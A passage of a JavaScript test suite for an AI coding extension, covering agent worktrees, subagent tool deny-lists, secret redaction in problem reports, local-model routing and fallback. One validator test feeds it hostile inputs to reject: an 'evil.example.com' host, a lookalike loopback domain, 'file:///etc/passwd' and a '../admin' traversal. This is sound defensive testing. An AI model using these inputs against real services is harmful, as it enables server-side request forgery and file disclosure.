				env: { ...process.env, ZER0NE_TASK: 'Fix the typo in app.js', ZER0NE_MODEL: 'm', ZER0NE_BASE_URL: `http://127.0.0.1:${server.address().port}${format === 'openai' ? '/v1' : ''}`, ZER0NE_FORMAT: format, ZER0NE_API_KEY: 'sk-test', ZER0NE_OUT: out, GITHUB_STEP_SUMMARY: '' },
				timeout: 60_000
			}, (err, stdout, stderr) => (err ? reject(new Error(stderr || err.message)) : resolve(stdout)))
		);
		await close(server);
		assert.strictEqual(fs.readFileSync(path.join(repo, 'app.js'), 'utf8'), 'const greeting = "hello";\n', format + ': edit applied');
		assert.ok(seen[0].url.endsWith(format === 'openai' ? '/v1/chat/completions' : '/v1/messages'));
		assert.ok(/sk-test/.test(seen[0].auth), 'key sent');
		assert.ok(fs.readFileSync(path.join(out, 'commit.txt'), 'utf8').startsWith('zer0ne: Fix the typo in app.js'));
		const { parseRunLog, parseGithubRemote, cloudEndpoint } = require(OUT + '/host/cloudHost.js');
		assert.deepStrictEqual(cloudEndpoint('gemini', 'https://generativelanguage.googleapis.com/v1beta/'), { format: 'openai', baseUrl: 'https://generativelanguage.googleapis.com/v1beta/openai' });
		assert.deepStrictEqual(cloudEndpoint('anthropic', 'https://api.anthropic.com'), { format: 'anthropic', baseUrl: 'https://api.anthropic.com' });
		assert.ok('error' in cloudEndpoint('vscode-lm', 'vscode-lm'), 'Copilot models cannot run in the cloud');
		const parsed = parseRunLog(log.split('\n').map((l) => '2026-09-24T10:00:00.0000000Z ' + l).join('\n') + '\n2026-09-24T10:00:01Z ZER0NE_RESULT pushed zer0ne/c1');
		assert.strictEqual(parsed.summary, 'Fixed the greeting typo.');
		assert.deepStrictEqual(parsed.steps.map((s) => s.tool), ['read_file', 'edit_file', 'run_command']);
		assert.ok(parsed.steps.every((s) => s.ok));
		assert.strictEqual(parsed.result, 'pushed zer0ne/c1');
		assert.strictEqual(parseGithubRemote('git@github.com:zer0ne/app.git'), 'zer0ne/app');
		assert.strictEqual(parseGithubRemote('https://github.com/zer0ne/my.repo'), 'zer0ne/my.repo');
		assert.strictEqual(parseGithubRemote('https://gitlab.com/a/b'), undefined);
	}
});

// ------------------------------------------------------------------ parallel writers (worktrees)

test('parallel writers: two agents edit in their own git worktrees at once; merge one, discard the other', async () => {
	const { execFileSync } = require('child_process');
	const repo = fs.mkdtempSync(path.join(tmp, 'writers-'));
	const g = (...a) => execFileSync('git', a, { cwd: repo, encoding: 'utf8' });
	g('init', '-q');
	g('config', 'core.autocrlf', 'false');
	fs.writeFileSync(path.join(repo, 'a.txt'), 'alpha\n');
	fs.writeFileSync(path.join(repo, 'b.txt'), 'beta\n');
	g('add', '-A');
	g('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init');
	const base = g('rev-parse', 'HEAD').trim();
	// Mock model: the task text says which file to change; first call edits it, second answers.
	const turns = new Map();
	const server = await listen(async (req, res) => {
		const b = JSON.parse(await body(req));
		const task = b.messages.find((m) => m.role === 'user').content;
		const file = /a\.txt/.test(task) ? 'a.txt' : 'b.txt';
		const n = (turns.get(file) || 0) + 1;
		turns.set(file, n);
		res.writeHead(200, { 'Content-Type': 'text/event-stream' });
		const ev = (o) => res.write('data: ' + JSON.stringify(o) + '\n\n');
		if (n === 1) {
			await new Promise((r) => setTimeout(r, 150)); // both writers are in flight together
			// Read, then edit (edits need the agent to have seen the file).
			ev({ choices: [{ delta: { tool_calls: [{ index: 0, id: 'r' + file, function: { name: 'read_file', arguments: JSON.stringify({ path: file }) } }, { index: 1, id: 'c' + file, function: { name: 'edit_file', arguments: JSON.stringify({ path: file, old_string: file === 'a.txt' ? 'alpha' : 'beta', new_string: file === 'a.txt' ? 'ALPHA' : 'BETA' }) } }, { index: 2, id: 'new' + file, function: { name: 'write_file', arguments: JSON.stringify({ path: 'new-' + file, content: 'new\n' }) } }] } }] });
		} else ev({ choices: [{ delta: { content: 'Changed ' + file + '.' } }] });
		res.end('data: [DONE]\n\n');
	});
	const { WriterPool } = require(OUT + '/host/writers.js');
	const pool = new WriterPool(() => undefined);
	const provider = { baseUrl: `http://127.0.0.1:${server.address().port}/v1`, apiKey: 'k', apiFormat: 'openai', model: 'm' };
	const common = { root: repo, provider, signal: new AbortController().signal, approveCommand: async () => false };
	const t0 = Date.now();
	const w1 = pool.start({ ...common, description: 'upper a', prompt: 'Uppercase a.txt' });
	const w2 = pool.start({ ...common, description: 'upper b', prompt: 'Uppercase b.txt' });
	const [j1, j2] = await Promise.all([w1.done, w2.done]);
	await close(server);
	assert.strictEqual(j1.status, 'done', j1.error);
	assert.strictEqual(j2.status, 'done', j2.error);
	assert.notStrictEqual(j1.dir, j2.dir, 'separate worktrees');
	assert.strictEqual(fs.readFileSync(path.join(repo, 'a.txt'), 'utf8'), 'alpha\n', 'the workspace is untouched while writers work');
	assert.strictEqual(fs.readFileSync(path.join(j1.dir, 'a.txt'), 'utf8'), 'ALPHA\n');
	assert.deepStrictEqual(j1.stat, { files: 2, added: 2, removed: 1 });
	for (const job of [j1, j2]) {
		assert.equal(execFileSync('git', ['rev-parse', 'HEAD'], { cwd: job.dir, encoding: 'utf8' }).trim(), base, 'no automatic writer commit');
		assert.equal(execFileSync('git', ['diff', '--cached', '--name-only'], { cwd: job.dir, encoding: 'utf8' }).trim(), '', 'no automatic writer staging');
	}
	assert.match(pool.describe(j1), /agent_merge/);
	assert.ok(Date.now() - t0 < 20_000);
	const diff = await pool.diff(j1.id);
	assert.deepStrictEqual(diff.files, ['a.txt', 'new-a.txt']);
	const recorded = [];
	const merged = await pool.merge(j1.id, repo, (rel, before, after) => recorded.push([rel, before, after]));
	assert.match(merged, /Merged 2 files/);
	assert.strictEqual(fs.readFileSync(path.join(repo, 'a.txt'), 'utf8'), 'ALPHA\n', 'merged into the workspace');
	assert.deepStrictEqual(recorded, [['a.txt', 'alpha\n', 'ALPHA\n'], ['new-a.txt', null, 'new\n']], 'recorded for Undo');
	assert.equal(g('diff', '--cached', '--name-only').trim(), '', 'merge preserves the workspace index');
	assert.equal(g('rev-parse', 'HEAD').trim(), base);
	assert.ok(!fs.existsSync(j1.dir), 'worktree removed after merge');
	await pool.discard(j2.id, repo);
	assert.strictEqual(fs.readFileSync(path.join(repo, 'b.txt'), 'utf8'), 'beta\n', 'discarded work never reaches the workspace');
	assert.ok(!g('branch').includes('zer0ne/'), 'writer branches cleaned up');
	await assert.rejects(pool.merge(j2.id, repo, () => undefined), /already discarded/);
});

// ------------------------------------------------------------------ CLI + ACP

// ------------------------------------------------------------------ Telegram bridge



test('Terminal preferences survive reload and reject invalid display values', async () => {
	const { ProviderStore } = require(OUT + '/providerStore.js');
	const state = new Map(), context = { globalState:{get:(key, fallback) => state.has(key) ? state.get(key) : fallback, update:async (key, value) => state.set(key, value)} };
	const store = new ProviderStore(context);
	assert.equal(store.getSettings().terminalFontSize, 0);
	assert.equal(store.getSettings().terminalLineHeight, 1.3);
	await store.updateSettings({terminalFontSize:18,terminalLineHeight:1.5,terminalCursorStyle:'bar',terminalCursorBlink:false,terminalScreenReader:true,terminalEffects:'retro',terminalProse:'reading'});
	const settings = new ProviderStore(context).getSettings();
	assert.equal(settings.terminalFontSize,18); assert.equal(settings.terminalLineHeight,1.5);
	assert.equal(settings.terminalCursorStyle,'bar'); assert.equal(settings.terminalCursorBlink,false);
	assert.equal(settings.terminalScreenReader,true); assert.equal(settings.terminalEffects,'retro'); assert.equal(settings.terminalProse,'reading');
	await store.updateSettings({terminalFontSize:99,terminalLineHeight:99,terminalCursorStyle:'invalid',terminalEffects:'invalid',terminalProse:'invalid'});
	const clamped = new ProviderStore(context).getSettings();
	assert.equal(clamped.terminalFontSize,24); assert.equal(clamped.terminalLineHeight,2);
	assert.equal(clamped.terminalCursorStyle,'block'); assert.equal(clamped.terminalEffects,'off'); assert.equal(clamped.terminalProse,'mono');
});

test('retired step limit: stored caps migrate to unlimited, long turns finish and Stop still works', async () => {
	const { ProviderStore } = require(OUT + '/providerStore.js');
	const { runAgentTurn } = require(OUT + '/core/turn.js');
	const store = new ProviderStore({ globalState: { get: (key, fallback) => key === 'aiChat.settings' ? { maxSteps: 3, subagents: true } : fallback } });
	assert.strictEqual(store.getSettings().maxSteps, 0);
	assert.strictEqual(store.getSettings().subagents, true);
	let calls = 0;
	const ctl = new AbortController();
	const options = { messages: [], maxSteps: store.getSettings().maxSteps, signal: ctl.signal, call: async () => ({ text: ++calls > 45 ? 'finished' : '', reasoning: '', toolCalls: calls > 45 ? [] : [{ id: String(calls), name: 'read', arguments: '{}' }] }), execute: async () => ({ api: 'ok' }) };
	const result = await runAgentTurn(options);
	assert.strictEqual(calls, 46);
	assert.strictEqual(result.text, 'finished');
	ctl.abort();
	const stopped = await runAgentTurn({ ...options, messages: [] });
	assert.strictEqual(stopped.stopReason, 'cancelled');
	assert.strictEqual(calls, 46, 'Stop prevents the next request');
});



test('Subagents (ZCode-style): built-ins, agent files with tools / model / maxTurns, Settings state, tool filter, model choice, saved files', async () => {
	const { PluginHost, BUILT_IN_AGENTS, toolList } = require(OUT + '/tools/plugins.js');
	const { agentTools, agentModel } = require(OUT + '/host/subagentRuntime.js');
	const { SubagentsHost, agentMarkdown, validAgentName } = require(OUT + '/host/subagentsHost.js');
	const ws = fs.mkdtempSync(path.join(tmp, 'subws-'));
	const user = fs.mkdtempSync(path.join(tmp, 'subuser-'));
	fs.mkdirSync(path.join(ws, '.zer0ne', 'agents'), { recursive: true });
	fs.writeFileSync(path.join(ws, '.zer0ne', 'agents', 'reviewer.md'), '---\nname: code-reviewer\ndescription: Reviews diffs\ntools: Read, Grep, Glob\ndisallowedTools: WebSearch\nmodel: haiku\nmaxTurns: 7\ncolor: purple\n---\nYou review code.\n');
	const plugins = new PluginHost(user, () => ws, () => []);
	assert.deepStrictEqual(toolList('[Read, "Grep"]'), ['Read', 'Grep']);
	let all = plugins.allAgents();
	assert.deepStrictEqual(all.slice(0, BUILT_IN_AGENTS.length).map((a) => a.name), BUILT_IN_AGENTS.map((a) => a.name), 'built-ins first');
	assert.deepStrictEqual(BUILT_IN_AGENTS.map((a) => a.name), ['Explore', 'general-purpose', 'Plan', 'reviewer']);
	const rev = all.find((a) => a.name === 'code-reviewer');
	assert.deepStrictEqual([rev.tools, rev.disallowedTools, rev.maxTurns, rev.color, rev.canWrite, rev.model], [['Read', 'Grep', 'Glob'], ['WebSearch'], 7, 'purple', false, 'haiku']);
	// Settings state: switched off → not offered; a model choice wins over the file.
	const mem = new Map();
	const memento = { get: (k, d) => (mem.has(k) ? mem.get(k) : d), update: async (k, v) => void mem.set(k, v) };
	const posts = [];
	const surface = { post: (m) => posts.push(m) };
	const store = { list: async () => [{ id: 'p', name: 'P', enabled: true, apiFormat: 'openai', models: [{ id: 'claude-haiku-4.5', enabled: true }, { id: 'big', enabled: true }] }], getApiKey: async () => 'k', getSettings: () => ({ subagents: true }) };
	const host = new SubagentsHost({ store, status() {} }, plugins, memento);
	await host.handle(surface, { type: 'subagentToggle', name: 'code-reviewer', enabled: false });
	assert.ok(!plugins.agents().some((a) => a.name === 'code-reviewer') && plugins.allAgents().some((a) => a.name === 'code-reviewer' && !a.enabled));
	await host.handle(surface, { type: 'subagentToggle', name: 'code-reviewer', enabled: true });
	await host.handle(surface, { type: 'subagentModel', name: 'code-reviewer', model: 'p::big' });
	const listed = posts.at(-1).data.agents.find((a) => a.name === 'code-reviewer');
	assert.deepStrictEqual([listed.modelOverride, listed.scope, listed.editable], ['p::big', 'project', true]);
	assert.strictEqual(posts.at(-1).data.agents.find((a) => a.name === 'Explore').editable, false, 'built-ins are not files');
	// Model: the Settings choice, else the file's alias against enabled models, else inherit.
	const current = { provider: { id: 'p' } };
	assert.strictEqual((await agentModel(store, plugins.agents().find((a) => a.name === 'code-reviewer'), current)).model.id, 'big');
	assert.strictEqual((await agentModel(store, { model: 'haiku' }, current)).model.id, 'claude-haiku-4.5');
	assert.strictEqual(await agentModel(store, { model: 'inherit' }, current), undefined);
	assert.strictEqual(await agentModel(store, { model: 'no-such' }, current), undefined);
	// Tools: Claude Code names map to zer0ne's; the deny-list wins.
	const defs = ['read_file', 'grep', 'list_files', 'web_search', 'web_fetch', 'run_command', 'mcp__gh__issues'].map((name) => ({ name, description: '', parameters: {} }));
	assert.deepStrictEqual(agentTools(defs, { tools: ['Read', 'Grep', 'Glob', 'WebSearch'], disallowedTools: ['WebSearch'] }).map((d) => d.name), ['read_file', 'grep', 'list_files']);
	assert.deepStrictEqual(agentTools(defs, { tools: ['*'], disallowedTools: ['Bash'] }).map((d) => d.name).includes('run_command'), false);
	assert.ok(agentTools(defs, { tools: ['Read', 'mcp__*'] }).some((d) => d.name === 'mcp__gh__issues'));
	// Saving writes a Claude Code-format file; a bad name or a duplicate is refused.
	assert.ok(validAgentName('doc-writer') && !validAgentName('bad name') && !validAgentName('-x'));
	const md = agentMarkdown({ name: 'doc-writer', description: 'Writes docs: "README" first', prompt: 'Write docs.', tools: 'read', model: 'p::big', color: 'green', maxTurns: 5, scope: 'user' });
	assert.match(md, /^---\nname: "doc-writer"\ndescription: "Writes docs: \\"README\\" first"\ntools: "Read, Grep, Glob, WebFetch, WebSearch"\nmodel: "p::big"\ncolor: green\nmaxTurns: 5\n---\n\nWrite docs.\n$/);
	await host.handle(surface, { type: 'subagentSave', draft: { name: 'doc-writer', description: 'Writes docs', prompt: 'Write docs.', tools: 'all', scope: 'user' } });
	assert.ok(fs.existsSync(path.join(user, 'agents', 'doc-writer.md')));
	all = plugins.allAgents();
	assert.ok(all.find((a) => a.name === 'doc-writer').canWrite, 'full toolset = can edit');
	await host.handle(surface, { type: 'subagentSave', draft: { name: 'Explore', description: 'x', prompt: 'y', tools: 'read', scope: 'user' } });
	assert.match(posts.find((m) => m.type === 'subagentError').error, /already an agent named/);
	await host.handle(surface, { type: 'subagentDelete', name: 'doc-writer' });
	assert.ok(!fs.existsSync(path.join(user, 'agents', 'doc-writer.md')));
	await host.handle(surface, { type: 'subagentDelete', name: 'Explore' });
	assert.ok(plugins.allAgents().some((a) => a.name === 'Explore'), 'built-ins cannot be deleted');
});

test('Report a problem: keys, tokens, home folder and user name never reach the report; issue links stay short', async () => {
	const R = require(OUT + '/host/reportHost.js');
	const home = process.platform === 'win32' ? 'C:\\Users\\alice' : '/home/alice';
	const secret = 'sk-ant-api03-' + 'x'.repeat(40);
	const leaky = [secret, 'aa_JrMpdTThJfIKRUfzfkdHlTJJviCmJAAo', 'Authorization: Bearer abc.def-ghi_jkl', 'ghp_' + 'A'.repeat(36), 'hf_' + 'b'.repeat(34), 'api_key=hunter2hunter2', home + '/project/src/app.ts', 'alice opened it'].join('\n');
	const clean = R.redact(leaky, home, 'alice');
	for (const bad of [secret, 'aa_JrMp', 'abc.def', 'ghp_A', 'hf_b', 'hunter2', 'alice']) assert.ok(!clean.includes(bad), 'removed: ' + bad);
	assert.match(clean, /~.project.src.app\.ts/, 'paths kept, home replaced');
	assert.ok(R.redact('src/host/localModelsHost.ts and b11169-vulkan/llama-server.exe').includes('localModelsHost.ts'), 'file paths are not mistaken for keys');
	assert.strictEqual(R.endpointOf('https://user:pw@api.example.com/v1/chat?key=1'), 'https://api.example.com');
	assert.strictEqual(R.endpointOf('http://127.0.0.1:11434/v1'), 'local :11434');
	assert.strictEqual(R.endpointOf('http://192.168.1.20:8080/v1'), 'private network');
	const text = R.buildReport({ version: '0.30.1', vscodeVersion: '1.105.0', platform: 'win32', release: '10.0', arch: 'x64', memoryGb: 32, providers: [{ name: 'Mine', apiFormat: 'openai', enabled: true, models: 2, baseUrl: 'https://api.example.com/v1?token=' + secret }], health: [{ id: 'model', label: 'Chat model', state: 'fail', detail: 'no key' }], engine: { version: 'b11169', crashes: 1 }, errors: [{ at: 0, message: 'HTTP 401 with key ' + secret }], settings: { sandbox: 'auto' } });
	assert.ok(!text.includes(secret) && !text.includes('token='), 'no secret anywhere in the report');
	for (const part of ['zer0ne coding 0.30.1', 'Mine — openai', 'https://api.example.com', '✗ Chat model: no key', '"version": "b11169"', 'HTTP 401', '"sandbox": "auto"']) assert.ok(text.includes(part), part);
	const link = R.issueLink('https://github.com/o/r/issues', 'Problem: x', 'y'.repeat(20000));
	assert.ok(link.startsWith('https://github.com/o/r/issues/new?title=Problem%3A%20x&body=') && link.length <= 7500, 'shortened to fit a URL');
	// The host collects, then hands the text to the UI to show (nothing is sent).
	let shown;
	const host = new R.ReportHost({ store: { list: async () => [], resolveSelection: async () => ({}), getSettings: () => ({ mode: 'agent', customInstructions: 'my secret notes' }) } }, { version: '1', vscodeVersion: '1', health: async () => [], engine: () => undefined, errors: () => [{ at: 0, message: 'boom' }], show: async (t, title) => (shown = { t, title }) });
	assert.strictEqual(await host.handle({}, { type: 'reportProblem' }), true);
	assert.ok(shown.t.includes('boom') && shown.title === 'Problem: boom');
	assert.ok(!shown.t.includes('my secret notes'), 'free-text settings are not included');
});

test('ACP errors: account verification is distinct from expired authentication', () => {
	const { AcpError, agentErrorMessage } = require(OUT + '/acp/client.js');
	const error = new AcpError('Agent execution terminated: request failed (code 403): Verify your account to continue.', -32000);
	assert.strictEqual(error.verificationRequired, true);
	assert.strictEqual(error.authRequired, false);
	assert.match(agentErrorMessage(error, 'Example'), /Example needs your account verified/);
	assert.match(agentErrorMessage(error, 'Example'), /Retry/);
	assert.match(agentErrorMessage(new AcpError('authentication required', -32000), 'Example'), /requires authentication/);
});

test('local discovery rejects unrelated JSON services and removes invalid or duplicate model IDs', async () => {
	const original = global.fetch;
	try {
		global.fetch = async (url) => new Response(JSON.stringify(String(url).includes(':1234/') ? { data: [{ id: 'local-model' }, null, {}, { id: 1 }, { id: 'local-model' }] } : { status: 'unrelated-service' }));
		const { detectServers } = require(OUT + '/localModels.js');
		const servers = await detectServers();
		assert.deepStrictEqual(servers.find((s) => s.id === 'lmstudio').models, ['local-model']);
		assert.strictEqual(servers.find((s) => s.id === 'vllm').running, false);
	} finally { global.fetch = original; }
});

// ------------------------------------------------------------------ local models: next level

test('local tool calls: near-JSON from small models is repaired, valid JSON untouched, code inside strings kept exact', () => {
	const { parseToolArgs } = require(OUT + '/tools/argRepair.js');
	assert.deepStrictEqual(parseToolArgs('{"path":"a.ts"}'), { path: 'a.ts' });
	assert.deepStrictEqual(parseToolArgs('```json\n{"path": "a.ts",}\n```'), { path: 'a.ts' });
	assert.deepStrictEqual(parseToolArgs('Sure! {path: "a.ts", recursive: True, depth: None}'), { path: 'a.ts', recursive: true, depth: null });
	assert.deepStrictEqual(parseToolArgs('{"path":"a.ts","old_string":"if (x) { y(); }"'), { path: 'a.ts', old_string: 'if (x) { y(); }' }, 'missing closing brace');
	assert.deepStrictEqual(parseToolArgs('{"code":"a = True, b = None,}"}'), { code: 'a = True, b = None,}' }, 'strings stay exact');
	assert.strictEqual(parseToolArgs('not json at all'), undefined);
	assert.strictEqual(parseToolArgs('[1,2]'), undefined, 'objects only');
	assert.deepStrictEqual(parseToolArgs(''), {});
});



test('every device: lean mode by window size, any-language tasklist, loopback-only benchmark targets, AMD ROCm builds, keychain key', async () => {
	const { wantsLean } = require(OUT + '/host/localRouting.js');
	const local = { baseUrl: 'http://localhost:8000/v1', apiFormat: 'openai' };
	assert.ok(wantsLean({ localTuned: true }, local, {}), 'unknown window (a fresh engine model): lean');
	assert.ok(wantsLean({ localTuned: true }, local, { contextWindow: 32768 }));
	assert.ok(!wantsLean({ localTuned: true }, local, { contextWindow: 131072 }), 'a workstation model with a big window keeps the full agent');
	assert.ok(!wantsLean({ localTuned: false }, local, { contextWindow: 8192 }), 'switch off');
	assert.ok(!wantsLean({ localTuned: true }, { baseUrl: 'https://api.openai.com/v1', apiFormat: 'openai' }, { contextWindow: 8192 }), 'cloud models never');
	const { tasklistBytes } = require(OUT + '/localLive.js');
	assert.strictEqual(tasklistBytes('"llama-server.exe","16564","Console","1","5,812,344 K"\r\n'), 5812344 * 1024, 'English');
	assert.strictEqual(tasklistBytes('"llama-server.exe","16564","Console","1","5.812.344 K"'), 5812344 * 1024, 'German');
	assert.strictEqual(tasklistBytes('"llama-server.exe","16564","Console","1","5 812 344 Ko"'), 5812344 * 1024, 'French');
	assert.strictEqual(tasklistBytes('INFO: No tasks are running which match the specified criteria.'), undefined);
	const { loopbackBase } = require(OUT + '/host/localPlus.js');
	assert.strictEqual(loopbackBase('http://127.0.0.1:1234/v1'), 'http://127.0.0.1:1234/v1');
	assert.strictEqual(loopbackBase('http://localhost:8000/api/v1'), 'http://127.0.0.1:8000/api/v1', 'Lemonade');
	assert.strictEqual(loopbackBase('http://127.0.0.1:8080'), 'http://127.0.0.1:8080/v1');
	for (const bad of ['http://192.168.1.5:1234/v1', 'https://evil.example.com/v1', 'http://127.0.0.1.evil.com:80/v1', 'file:///etc/passwd', 'http://127.0.0.1:1234/v1/../admin']) assert.strictEqual(loopbackBase(bad), undefined, bad);
	const { pickAsset } = require(OUT + '/localEngine.js');
	assert.strictEqual(pickAsset(['llama-b1-bin-win-rocm-10.0-x64.zip', 'llama-b1-bin-win-vulkan-x64.zip'], 'rocm', 'win32', 'x64'), 'llama-b1-bin-win-rocm-10.0-x64.zip');
	assert.strictEqual(pickAsset(['llama-b1-bin-ubuntu-rocm-10.0-x64.tar.gz'], 'rocm', 'linux', 'x64'), 'llama-b1-bin-ubuntu-rocm-10.0-x64.tar.gz');
	assert.strictEqual(pickAsset(['llama-b1-bin-macos-arm64.tar.gz'], 'rocm', 'darwin', 'arm64'), undefined, 'no ROCm on macOS');
	// The Local Host key: moved from plain settings into the OS keychain once, then read from there.
	const { LocalPlus } = require(OUT + '/host/localPlus.js');
	const store = new Map([['zer0ne.localHost', { enabled: false, port: 11435, key: 'zk-legacyLegacyLegacy1' }]]);
	const memento = { get: (k, d) => (store.has(k) ? store.get(k) : d), update: async (k, v) => void store.set(k, v) };
	const vault = new Map();
	const secrets = { get: async (k) => vault.get(k), store: async (k, v) => void vault.set(k, v), delete: async (k) => void vault.delete(k) };
	const plus = new LocalPlus({ ctx: { postAll() {}, status() {}, store: { getSettings: () => ({}) } }, memento, storageDir: path.join(tmp, 'plus'), enginePort: () => 8181, enginePid: () => undefined, engineRunning: () => undefined, engineServerPath: () => undefined, engineBackend: () => undefined, engineModels: () => [], ensureLoaded: async () => {}, stopEngine() {}, ollama: async () => ({ base: '', tags: [] }), refresh: async () => {}, installEngine: async () => {}, secrets });
	await new Promise((r) => setTimeout(r, 50));
	assert.strictEqual(vault.get('zer0ne.localHost.key'), 'zk-legacyLegacyLegacy1', 'moved to the keychain');
	assert.ok(!('key' in store.get('zer0ne.localHost')), 'and removed from plain settings');
	assert.strictEqual(plus.state().host.key, 'zk-legacyLegacyLegacy1');
	plus.dispose();
});

test('hybrid routing: an unreachable cloud model continues on the local helper; other errors do not', async () => {
	const { ModelCaller } = require(OUT + '/host/modelCaller.js');
	const providers = [
		{ id: 'C', name: 'Cloud', baseUrl: 'https://api.example.com/v1', apiFormat: 'openai', enabled: true, models: [{ id: 'big' }] },
		{ id: 'L', name: 'zer0ne Engine', preset: 'zer0ne-engine', baseUrl: 'http://127.0.0.1:8181/v1', apiFormat: 'openai', enabled: true, models: [{ id: 'small' }] }
	];
	let settings = { fallbackModels: '', retryErrors: false, offlineFallback: true, localHelper: 'L::small', localHelperTasks: 'compaction' };
	const store = { getSettings: () => settings, list: async () => providers, getApiKey: async () => '', keyCount: async () => 1, rotateKey: async () => false };
	const statuses = [];
	let cloudError = 'Could not reach https://api.example.com/v1 (getaddrinfo ENOTFOUND api.example.com) — check the Base URL and your connection.';
	const caller = new ModelCaller({ store, status: (m) => statuses.push(m), callModel: async (p) => { if (p.id === 'C') throw new Error(cloudError); return { text: 'answered locally', toolCalls: [] }; } }, 60_000);
	const run = () => {
		const active = { provider: providers[0], model: providers[0].models[0], apiKey: '' };
		return caller.callResilient(active, settings, new AbortController().signal, { text: '', reasoning: '' }, (b) => b).then((r) => [r.text, active.model.id]);
	};
	assert.deepStrictEqual(await run(), ['answered locally', 'small']);
	assert.match(statuses.join('\n'), /continuing offline on small/);
	cloudError = 'Provider error 402: out of credits';
	await assert.rejects(run(), /402/, 'an account problem is not "offline"');
	cloudError = 'fetch failed';
	settings = { ...settings, offlineFallback: false };
	await assert.rejects(run(), /fetch failed/, 'switch off = no fallback');
});

test('model fallback: the ladder works, and noModelFallback is a full kill switch', async () => {
	const { ModelCaller } = require(OUT + '/host/modelCaller.js');
	const providers = [
		{ id: 'C', name: 'Cloud', baseUrl: 'https://api.example.com/v1', apiFormat: 'openai', enabled: true, models: [{ id: 'big' }] },
		{ id: 'F', name: 'Backup', baseUrl: 'https://backup.example.com/v1', apiFormat: 'openai', enabled: true, models: [{ id: 'big' }] }
	];
	const makeStore = { getSettings: () => settings, list: async () => providers, getApiKey: async () => '', keyCount: async () => 1, rotateKey: async () => false };
	const build = (over) => {
		settings = { fallbackModels: 'F::big', retryErrors: true, offlineFallback: false, localHelper: '', ...over };
		return new ModelCaller({ store: makeStore, status: () => {}, callModel: async (p) => { if (p.id === 'C') throw new Error('Provider error 529: overloaded'); return { text: 'from ' + p.id, toolCalls: [] }; } }, 60_000);
	};
	const run = (caller) => caller.callResilient({ provider: providers[0], model: providers[0].models[0], apiKey: '' }, settings, new AbortController().signal, { text: '', reasoning: '' }, (b) => b).then((r) => r.text);
	assert.strictEqual(await run(build({})), 'from F', 'a failing model falls back');
	// The kill switch: the original error surfaces, never a substitution.
	const killed = build({ noModelFallback: true });
	await assert.rejects(() => killed.callResilient({ provider: providers[0], model: providers[0].models[0], apiKey: '' }, settings, new AbortController().signal, { text: '', reasoning: '' }, (b) => b), /529/, 'kill switch: the error surfaces, no substitution');
});

test('Intel backends: SYCL / OpenVINO builds are picked, and a release still uploading is skipped', () => {
	const { pickAsset, pickRelease } = require(OUT + '/localEngine.js');
	const win = ['llama-b11263-bin-win-vulkan-x64.zip', 'llama-b11263-bin-win-sycl-x64.zip', 'llama-b11263-bin-win-openvino-2026.4-x64.zip', 'llama-b11263-bin-win-cpu-x64.zip'];
	assert.strictEqual(pickAsset(win, 'sycl', 'win32', 'x64'), 'llama-b11263-bin-win-sycl-x64.zip');
	assert.strictEqual(pickAsset(win, 'openvino', 'win32', 'x64'), 'llama-b11263-bin-win-openvino-2026.4-x64.zip');
	assert.strictEqual(pickAsset(win, 'sycl', 'win32', 'arm64'), undefined, 'Intel runtimes are x64 only');
	const linux = ['llama-b1-bin-ubuntu-sycl-fp32-x64.tar.gz', 'llama-b1-bin-ubuntu-sycl-fp16-x64.tar.gz', 'llama-b1-bin-ubuntu-openvino-2026.4-x64.tar.gz'];
	assert.strictEqual(pickAsset(linux, 'sycl', 'linux', 'x64'), 'llama-b1-bin-ubuntu-sycl-fp16-x64.tar.gz', 'fp16 preferred on Linux');
	assert.strictEqual(pickAsset(win, 'vulkan', 'win32', 'x64'), 'llama-b11263-bin-win-vulkan-x64.zip', 'Vulkan unchanged');
	const releases = [
		{ tag_name: 'b11264', assets: [{ name: 'cudart-llama-bin-win-cuda-12.4-x64.zip' }] },
		{ tag_name: 'b11263', assets: win.map((name) => ({ name })) }
	];
	const found = pickRelease(releases, (names) => pickAsset(names, 'sycl', 'win32', 'x64'));
	assert.deepStrictEqual([found.rel.tag_name, found.name], ['b11263', 'llama-b11263-bin-win-sycl-x64.zip']);
	const { missingRuntime } = require(OUT + '/localEngine.js');
	assert.match(missingRuntime('ggml_sycl_init: no Level Zero devices, ze_loader failed', 'sycl'), /Intel/);
});

test('live monitor: Prometheus metrics parse; benchmark scores a tool-capable and a tool-blind model', async () => {
	const { parseMetrics } = require(OUT + '/localLive.js');
	assert.deepStrictEqual(parseMetrics('# HELP x\nllamacpp:tokens_predicted_total 251\nllamacpp:requests_processing{slot="0"} 1\nbad line\n'), { tokens_predicted_total: 251, requests_processing: 1 });
	const { benchmarkModel } = require(OUT + '/localBench.js');
	const reply = (msg, extra = {}) => JSON.stringify({ choices: [{ message: msg }], ...extra });
	const make = (smart) => listen((req, res) => {
		let body = '';
		req.on('data', (c) => (body += c));
		req.on('end', () => {
			const j = JSON.parse(body);
			const last = j.messages[j.messages.length - 1].content;
			res.setHeader('Content-Type', 'application/json');
			if (!j.tools) return res.end(reply({ content: 'function debounce() {}' }, { timings: { predicted_per_second: 21.37, prompt_per_second: 400.2, prompt_ms: 812 } }));
			if (!smart) return res.end(reply({ content: 'I would open the file.' }));
			if (/server\.ts/.test(last)) return res.end(reply({ content: null, tool_calls: [{ function: { name: 'read_file', arguments: '{"path":"src/server.ts"}' } }] }));
			if (/8080/.test(last)) return res.end(reply({ content: null, tool_calls: [{ function: { name: 'edit_file', arguments: '{path: "src/config.ts", old_string: "const PORT = 3000;", new_string: "const PORT = 8080;"}' } }] }));
			res.end(reply({ content: 'It means the resource was not found.' }));
		});
	});
	const good = await make(true);
	const r = await benchmarkModel(`http://127.0.0.1:${good.address().port}/v1`, 'm', { backend: 'vulkan' });
	assert.deepStrictEqual([r.tokS, r.promptTokS, r.ttftMs, r.backend], [21.4, 400, 812, 'vulkan']);
	assert.deepStrictEqual(r.checks.map((c) => [c.id, c.ok]), [['tool_pick', true], ['tool_args', true], ['restraint', true], ['json', false]], 'the edit call needed repair: not valid JSON as written');
	assert.strictEqual(r.score, 75);
	await close(good);
	const blind = await make(false);
	const b = await benchmarkModel(`http://127.0.0.1:${blind.address().port}/v1`, 'm');
	assert.strictEqual(b.score, 25, 'answers, but never calls a tool');
	await close(blind);
	// Ollama / LM Studio: no llama.cpp timings, only usage — speed is timed from outside.
	const plain = await listen((req, res) => {
		req.resume();
		req.on('end', () => setTimeout(() => res.end(JSON.stringify({ choices: [{ message: { content: 'ok' } }], usage: { completion_tokens: 50 } })), 250));
	});
